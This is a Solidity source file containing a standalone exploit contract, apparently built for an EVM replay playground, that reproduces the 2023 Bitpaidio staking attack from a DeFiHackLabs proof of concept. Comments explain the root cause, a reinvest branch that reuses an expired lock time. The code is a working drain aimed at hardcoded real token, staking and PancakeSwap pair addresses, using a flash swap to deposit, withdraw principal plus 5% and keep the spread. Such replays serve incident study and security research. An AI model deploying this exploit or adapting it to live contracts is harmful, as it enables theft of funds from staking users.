// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-Bitpaidio).
// The DeFiHackLabs PoC runs the whole attack inline on the Foundry test contract
// itself (`ContractTest is Test`) — attacker = address(this), and the PancakeSwap
// V2 flash-swap callback (`pancakeCall`) lives directly on the test. This is a
// faithful, self-contained copy of that inline attack's RECORDED portion
// (testExploit's flash-swap -> run, pancakeCall unchanged) so the playground can
// deploy it and record run(). The unrecorded priming deposit (firstLock()) and
// the 180-day wait (vm.warp) are reproduced via the config's `setup` block
// instead (see poc-configs/2023-05-Bitpaidio.mjs). Logic and constants are
// copied verbatim from test/Bitpaidio_exp.sol.
//
// Root cause: Staking.Lock_Token()'s "reinvest" branch (sixMonth[user].reinvest
// == 1) blindly re-uses the ALREADY-STORED end_time instead of re-validating or
// extending it. A zero-value deposit (Lock_Token(1, 0)) is enough to plant a
// dead-cheap "timer" (reinvest=1, end_time=now+180 days, amount=0) at zero cost.
// Once that end_time is in the past, ANY subsequent deposit into the same slot
// -- however large -- inherits the stale, already-expired end_time and is
// instantly withdrawable via withdraw(1), which pays principal + 5% ROI. Wrapped
// in a PancakeSwap V2 flash-swap, the attacker never needs their own capital:
// borrow BTP -> deposit it into the pre-aged slot -> withdraw immediately
// (principal + 5%) -> repay the flash loan (+0.25% fee) -> keep the ~4.75% net
// spread as risk-free profit.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IStaking {
    function Lock_Token(uint256 plan, uint256 _amount) external;
    function withdraw(uint256 _plan) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract BitpaidioDrain {
    IERC20 constant BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);
    IStaking constant Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);
    IUniPairV2 constant Pair = IUniPairV2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
    uint256 constant flashAmount = 219_349 * 1e18;

    // Faithful copy of testExploit()'s recorded portion: flash-swap BTP from
    // the pair (which calls back into pancakeCall below). The priming
    // Lock_Token(1, 0) deposit + the 180-day wait (testExploit's firstLock()
    // + vm.warp()) happen long before this call in the real attack, so the
    // playground config reproduces their effect via unrecorded `setup`
    // (a storeSlot of the exact same sixMonth[attacker] fields Lock_Token(1,0)
    // would have written, plus a blockTimestamp override for the elapsed
    // time) rather than re-running them here.
    function run() external {
        Pair.swap(flashAmount, 0, address(this), new bytes(1));
    }

    // PancakeSwap V2 flash-swap callback. Deposits the borrowed BTP into the
    // pre-aged (reinvest==1, expired end_time) slot -- the REINVEST branch
    // inherits that stale end_time unchanged -- then immediately withdraws
    // principal + 5% ROI, and repays the flash loan (+0.25% fee).
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        BTP.approve(address(Staking), type(uint256).max);
        Staking.Lock_Token(1, BTP.balanceOf(address(this)));
        Staking.withdraw(1);
        BTP.transfer(msg.sender, (flashAmount * 10_000) / 9975 + 1000);
    }
}
